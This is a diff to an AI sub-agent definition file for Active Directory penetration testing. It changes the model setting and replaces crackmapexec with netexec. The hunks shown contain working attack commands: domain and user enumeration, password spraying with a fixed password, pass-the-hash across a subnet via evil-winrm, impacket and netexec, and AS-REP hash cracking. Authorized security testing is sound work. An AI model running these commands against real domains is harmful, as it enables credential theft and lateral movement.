@@ -1,8 +1,8 @@
 ---
 name: active-directory
-description: Active Directory and Windows domain attack specialist. Use for Kerberoasting, AS-REP roasting, DCSync, BloodHound enumeration, ADCS ESC attacks, Golden/Silver Ticket, and domain privilege escalation. Triggers on: kerberoast, AS-REP, bloodhound, DCSync, golden ticket, ADCS, ESC, domain controller, LDAP, GPO, AD, domain admin.
+description: Active Directory exploitation specialist — BloodHound attack path analysis, Kerberoasting, AS-REP roasting, DCSync, ACL abuse, certificate services (AD-CS ESC1-ESC8), domain persistence, and GPO exploitation.
 tools: Bash, Read, Write
-model: opus
+model: sonnet
 ---
 
 ## Cybersecurity Skills (Invoke First)
@@ -31,11 +31,11 @@ enum4linux-ng -A $DC_IP 2>&1 | tee evidence/$(date +%Y%m%d)/$TARGET/ad/enum4linu
 ldapdomaindump -u "$DOMAIN\\$USER" -p "$PASS" $DC_IP \
   -o evidence/$(date +%Y%m%d)/$TARGET/ad/ldapdump/ 2>&1
 
-# Domain info via crackmapexec
-crackmapexec smb $DC_IP --shares 2>&1 | tee evidence/$(date +%Y%m%d)/$TARGET/ad/cme_shares.txt
-crackmapexec smb $DC_IP --users 2>&1 | tee evidence/$(date +%Y%m%d)/$TARGET/ad/cme_users.txt
-crackmapexec smb $DC_IP --groups 2>&1 | tee evidence/$(date +%Y%m%d)/$TARGET/ad/cme_groups.txt
-crackmapexec smb $DC_IP --pass-pol 2>&1 | tee evidence/$(date +%Y%m%d)/$TARGET/ad/pass_policy.txt
+# Domain info via NetExec (CrackMapExec / NetExec — same CLI syntax)
+netexec smb $DC_IP --shares 2>&1 | tee evidence/$(date +%Y%m%d)/$TARGET/ad/cme_shares.txt
+netexec smb $DC_IP --users 2>&1 | tee evidence/$(date +%Y%m%d)/$TARGET/ad/cme_users.txt
+netexec smb $DC_IP --groups 2>&1 | tee evidence/$(date +%Y%m%d)/$TARGET/ad/cme_groups.txt
+netexec smb $DC_IP --pass-pol 2>&1 | tee evidence/$(date +%Y%m%d)/$TARGET/ad/pass_policy.txt
 
 # RPCClient enum
 rpcclient -U "$USER%$PASS" $DC_IP -c "enumdomusers" 2>/dev/null | \
@@ -150,9 +150,9 @@ hashcat -m 18200 \
 
 ## Password Spraying
 ```bash
-# CrackMapExec SMB spray (SLOW — respect lockout policy!)
-# Check pass policy FIRST: crackmapexec smb $DC_IP --pass-pol
-crackmapexec smb $DC_IP \
+# NetExec SMB spray (SLOW — respect lockout policy!)
+# Check pass policy FIRST: netexec smb $DC_IP --pass-pol
+netexec smb $DC_IP \
   -u evidence/$(date +%Y%m%d)/$TARGET/ad/users.txt \
   -p 'Password123!' \
   --continue-on-success \
@@ -299,8 +299,8 @@ impacket-smbexec -hashes ":$NTLM_HASH" "$DOMAIN/$USER@$TARGET"
 # Evil-WinRM with hash
 evil-winrm -i $TARGET -u $USER -H $NTLM_HASH
 
-# CrackMapExec PTH
-crackmapexec smb $SUBNET/24 \
+# NetExec PTH (CrackMapExec / NetExec — same CLI syntax)
+netexec smb $SUBNET/24 \
   -u $USER -H $NTLM_HASH \
   --continue-on-success 2>&1
 ```
